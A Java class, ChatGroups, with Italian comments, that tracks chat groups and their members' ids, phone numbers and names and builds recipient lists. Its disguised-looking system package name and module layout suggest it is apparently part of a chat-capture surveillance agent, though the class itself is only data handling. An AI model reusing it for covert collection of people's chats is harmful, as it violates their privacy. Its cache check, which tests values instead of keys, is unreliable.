package com.android.syssetup.module.chat;

import java.util.HashSet;
import java.util.Hashtable;
import java.util.Set;

import com.android.syssetup.auto.Cfg;
import com.android.syssetup.util.Check;

/* Gestore di gruppi di utenti nelle chat */
public class ChatGroups {
	private static final String TAG = "ChatGroups";
	private static final int F_ID = 0;
	private static final int F_NUMBER = 1;
	private static final int F_NAME = 2;

	Contact contact;
	Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();

	final Hashtable<String, Set<String>> groups = new Hashtable<String, Set<String>>();
	final Hashtable<String, String> tos = new Hashtable<String, String>();

	public void addLocalToAllGroups(String local) {
		for (String key : groups.keySet()) {
			groups.get(key).add(local);
		}
	}

	public void addPeerToGroup(String groupName, String remote) {
		addPeerToGroup(groupName, new Contact(remote));
	}

	/*
	 * identificato un gruppo si aggiunge, uno alla volta con questo metodo, un
	 * peer
	 */
	public void addPeerToGroup(String groupName, Contact remote) {
		if (Cfg.DEBUG) {
			Check.requires(isGroup(groupName), "peer is not a group: " + groupName);
			Check.log("Adding group " + groupName + " : " + remote.id + "," + remote.name);
		}

		Set<String> set;
		if (!groups.containsKey(groupName)) {
			set = new HashSet<String>();
		} else {
			set = groups.get(groupName);
		}

		set.add(remote.id);
		contacts.put(remote.id, remote);

		groups.put(groupName, set);
	}

	Contact getContact(String id) {
		try {
			return contacts.get(id);
		} catch (NullPointerException ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getContact) Error: " + ex);
			}
			return null;
		}
	}

	/* dato un autore e un gruppo, restituisce la stringa di tutti i destinatari */
	private String getGroupTo(String author, String groupname, int field) {
		if (Cfg.DEBUG) {
			Check.requires(author != null, "null author");
			Check.requires(groupname != null, "null groupname");
			// Check.log(TAG + " (getGroupTo) %s, %s", author, groupname);
		}

		String key = author + groupname;
		if (tos.contains(key)) {
			return tos.get(key);
		}

		Set<String> set = groups.get(groupname);
		if (set == null) {
			return null;
		}
		StringBuilder builder = new StringBuilder();
		for (String cid : set) {
			if (Cfg.DEBUG) {
				Check.asserts(cid != null, " (getGroupTo) Assert failed, cid null");
			}
			Contact c = contacts.get(cid);
			if (c != null && !author.equals(c.number) && !author.equals(cid)) {
				if (field == F_ID) {
					builder.append(c.id);
				} else if (field == F_NUMBER){
					builder.append(c.number);
				} else {
					builder.append(c.name);
				}
				builder.append(",");
			}
		}

		String value = builder.toString();
		if (value.endsWith(",")) {
			value = value.substring(0, value.length() - 1);
		}
		tos.put(key, value);
		return value;
	}

	String getGroupToDisplayName(String author, String groupname) {
		return getGroupTo(author, groupname, F_NAME);
	}

	String getGroupToId(String author, String groupname) {
		return getGroupTo(author, groupname, F_ID);
	}

	public String getGroupToName(String author, String groupname) {
		return getGroupTo(author, groupname, F_NUMBER);
	}

	/* dato un peer, dice se e' un gruppo */
	boolean isGroup(String peer) {
		return true;
	};

	/* verifica che il gruppo sia gia' presente */
	public boolean hasMemoizedGroup(String groupName) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (hasMemoizedGroup) : " + groupName + " : " + groups.containsKey(groupName));
		}
		return groups.containsKey(groupName);
	}

	public Set<String> getAllGroups() {
		return groups.keySet();

	}

	public String getName(String from_id) {

		Contact c = contacts.get(from_id);
		if (c != null) {
			return c.name;
		}

		return null;

	}


	public int size() {
		return groups.size();
	}
}
